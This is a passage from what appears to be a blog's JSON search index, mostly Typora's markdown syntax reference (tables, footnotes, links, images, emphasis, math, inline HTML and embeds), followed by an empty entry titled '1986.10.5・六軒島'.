\\begin{vmatrix} \\mathbf{i} \u0026 \\mathbf{j} \u0026 \\mathbf{k} \\\\ \\frac{\\partial X}{\\partial u} \u0026 \\frac{\\partial Y}{\\partial u} \u0026 0 \\\\ \\frac{\\partial X}{\\partial v} \u0026 \\frac{\\partial Y}{\\partial v} \u0026 0 \\\\ \\end{vmatrix} $$ In the markdown source file, the math block is a LaTeX expression wrapped by a pair of ‘$$’ marks:\n$$ \\mathbf{V}_1 \\times \\mathbf{V}_2 = \\begin{vmatrix} \\mathbf{i} \u0026amp; \\mathbf{j} \u0026amp; \\mathbf{k} \\\\ \\frac{\\partial X}{\\partial u} \u0026amp; \\frac{\\partial Y}{\\partial u} \u0026amp; 0 \\\\ \\frac{\\partial X}{\\partial v} \u0026amp; \\frac{\\partial Y}{\\partial v} \u0026amp; 0 \\\\ \\end{vmatrix} $$ You can find more details here.\nTables Input | First Header | Second Header | and press the return key. This will create a table with two columns.\nAfter a table is created, putting focus on that table will open up a toolbar for the table where you can resize, align, or delete the table. You can also use the context menu to copy and add/delete individual columns/rows.\nThe full syntax for tables is described below, but it is not necessary to know the full syntax in detail as the markdown source code for tables is generated automatically by Typora.\nIn markdown source code, they look like:\n| First Header | Second Header | | ------------- | ------------- | | Content Cell | Content Cell | | Content Cell | Content Cell | You can also include inline Markdown such as links, bold, italics, or strikethrough in the table.\nFinally, by including colons (:) within the header row, you can define text in that column to be left-aligned, right-aligned, or center-aligned:\n| Left-Aligned | Center Aligned | Right Aligned | | :------------ |:---------------:| -----:| | col 3 is | some wordy text | $1600 | | col 2 is | centered | $12 | | zebra stripes | are neat | $1 | A colon on the left-most side indicates a left-aligned column; a colon on the right-most side indicates a right-aligned column; a colon on both sides indicates a center-aligned column.\nFootnotes You can create footnotes like this[^footnote]. [^footnote]: Here is the *text* of the **footnote**. will produce:\nYou can create footnotes like this1.\nHover over the ‘footnote’ superscript to see content of the footnote.\nHorizontal Rules Inputting *** or --- on a blank line and pressing return will draw a horizontal line.\nYAML Front Matter Typora now supports YAML Front Matter. Input --- at the top of the article and then press Return to introduce a metadata block. Alternatively, you can insert a metadata block from the top menu of Typora.\nTable of Contents (TOC) Input [toc] and press the Return key. This will create a “Table of Contents” section. The TOC extracts all headers from the document, and its contents are updated automatically as you add to the document.\nSpan Elements Span elements will be parsed and rendered right after typing. Moving the cursor in middle of those span elements will expand those elements into markdown source. Below is an explanation of the syntax for each span element.\nLinks Markdown supports two styles of links: inline and reference.\nIn both styles, the link text is delimited by [square brackets].\nTo create an inline link, use a set of regular parentheses immediately after the link text’s closing square bracket. Inside the parentheses, put the URL where you want the link to point, along with an optional title for the link, surrounded in quotes. For example:\nThis is [an example](http://example.com/ \u0026#34;Title\u0026#34;) inline link. [This link](http://example.net/) has no title attribute. will produce:\nThis is an example inline link. (\u0026lt;p\u0026gt;This is \u0026lt;a href=\u0026quot;http://example.com/\u0026quot; title=\u0026quot;Title\u0026quot;\u0026gt;)\nThis link has no title attribute. (\u0026lt;p\u0026gt;\u0026lt;a href=\u0026quot;http://example.net/\u0026quot;\u0026gt;This link\u0026lt;/a\u0026gt; has no)\nInternal Links You can set the href to headers, which will create a bookmark that allow you to jump to that section after clicking. For example:\nCommand(on Windows: Ctrl) + Click This link will jump to header Block Elements. To see how to write that, please move cursor or click that link with ⌘ key pressed to expand the element into markdown source.\nReference Links Reference-style links use a second set of square brackets, inside which you place a label of your choosing to identify the link:\nThis is [an example][id] reference-style link. Then, anywhere in the document, you define your link label on a line by itself like this: [id]: http://example.com/ \u0026#34;Optional Title Here\u0026#34; In Typora, they will be rendered like so:\nThis is an example reference-style link.\nThe implicit link name shortcut allows you to omit the name of the link, in which case the link text itself is used as the name. Just use an empty set of square brackets — for example, to link the word “Google” to the google.com web site, you could simply write:\n[Google][] And then define the link: [Google]: http://google.com/ In Typora, clicking the link will expand it for editing, and command+click will open the hyperlink in your web browser.\nURLs Typora allows you to insert URLs as links, wrapped by \u0026lt;brackets\u0026gt;.\n\u0026lt;i@typora.io\u0026gt; becomes i@typora.io.\nTypora will also automatically link standard URLs. e.g: www.google.com.\nImages Images have similar syntax as links, but they require an additional ! char before the start of the link. The syntax for inserting an image looks like this:\n![Alt text](/path/to/img.jpg) ![Alt text](/path/to/img.jpg \u0026#34;Optional title\u0026#34;) You are able to use drag \u0026amp; drop to insert an image from an image file or your web browser. You can modify the markdown source code by clicking on the image. A relative path will be used if the image that is added using drag \u0026amp; drop is in same directory or sub-directory as the document you\u0026rsquo;re currently editing.\nIf you’re using markdown for building websites, you may specify a URL prefix for the image preview on your local computer with property typora-root-url in YAML Front Matters. For example, input typora-root-url:/User/Abner/Website/typora.io/ in YAML Front Matters, and then ![alt](/blog/img/test.png) will be treated as ![alt](file:///User/Abner/Website/typora.io/blog/img/test.png) in Typora.\nYou can find more details here.\nEmphasis Markdown treats asterisks (*) and underscores (_) as indicators of emphasis. Text wrapped with one * or _ will be wrapped with an HTML \u0026lt;em\u0026gt; tag. E.g:\n*single asterisks* _single underscores_ output:\nsingle asterisks\nsingle underscores\nGFM will ignore underscores in words, which is commonly used in code and names, like this:\nwow_great_stuff\ndo_this_and_do_that_and_another_thing.\nTo produce a literal asterisk or underscore at a position where it would otherwise be used as an emphasis delimiter, you can backslash escape it:\n\\*this text is surrounded by literal asterisks\\* Typora recommends using the * symbol.\nStrong A double * or _ will cause its enclosed contents to be wrapped with an HTML \u0026lt;strong\u0026gt; tag, e.g:\n**double asterisks** __double underscores__ output:\ndouble asterisks\ndouble underscores\nTypora recommends using the ** symbol.\nCode To indicate an inline span of code, wrap it with backtick quotes (`). Unlike a pre-formatted code block, a code span indicates code within a normal paragraph. For example:\nUse the `printf()` function. will produce:\nUse the printf() function.\nStrikethrough GFM adds syntax to create strikethrough text, which is missing from standard Markdown.\n~~Mistaken text.~~ becomes Mistaken text.\nUnderlines Underline is powered by raw HTML.\n\u0026lt;u\u0026gt;Underline\u0026lt;/u\u0026gt; becomes Underline.\nEmoji :smile: Input emoji with syntax :smile:.\nUser can trigger auto-complete suggestions for emoji by pressing ESC key, or trigger it automatically after enabling it on preference panel. Also, inputting UTF-8 emoji characters directly is also supported by going to Edit -\u0026gt; Emoji \u0026amp; Symbols in the menu bar (macOS).\nInline Math To use this feature, please enable it first in the Preference Panel -\u0026gt; Markdown Tab. Then, use $ to wrap a TeX command. For example: $\\lim_{x \\to \\infty} \\exp(-x) = 0$ will be rendered as LaTeX command.\nTo trigger inline preview for inline math: input “$”, then press the ESC key, then input a TeX command.\nYou can find more details here.\nSubscript To use this feature, please enable it first in the Preference Panel -\u0026gt; Markdown Tab. Then, use ~ to wrap subscript content. For example: H~2~O, X~long\\ text~/\nSuperscript To use this feature, please enable it first in the Preference Panel -\u0026gt; Markdown Tab. Then, use ^ to wrap superscript content. For example: X^2^.\nHighlight To use this feature, please enable it first in the Preference Panel -\u0026gt; Markdown Tab. Then, use == to wrap highlight content. For example: ==highlight==.\nHTML You can use HTML to style content what pure Markdown does not support. For example, use \u0026lt;span style=\u0026quot;color:red\u0026quot;\u0026gt;this text is red\u0026lt;/span\u0026gt; to add text with red color.\nEmbed Contents Some websites provide iframe-based embed code which you can also paste into Typora. For example:\n\u0026lt;iframe height=\u0026#39;265\u0026#39; scrolling=\u0026#39;no\u0026#39; title=\u0026#39;Fancy Animated SVG Menu\u0026#39; src=\u0026#39;http://codepen.io/jeangontijo/embed/OxVywj/?height=265\u0026amp;theme-id=0\u0026amp;default-tab=css,result\u0026amp;embed-version=2\u0026#39; frameborder=\u0026#39;no\u0026#39; allowtransparency=\u0026#39;true\u0026#39; allowfullscreen=\u0026#39;true\u0026#39; style=\u0026#39;width: 100%;\u0026#39;\u0026gt;\u0026lt;/iframe\u0026gt; Video You can use the \u0026lt;video\u0026gt; HTML tag to embed videos. For example:\n\u0026lt;video src=\u0026#34;xxx.mp4\u0026#34; /\u0026gt; Other HTML Support You can find more details here.\nHere is the text of the footnote.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"2021-07-23T00:00:00Z","permalink":"/p/markdown-references/","title":"Lorem ipsum"},{"content":"\n","date":"1986-10-05T00:00:00Z","permalink":"/p/senntaku/","title":"1986.10.5・六軒島"}]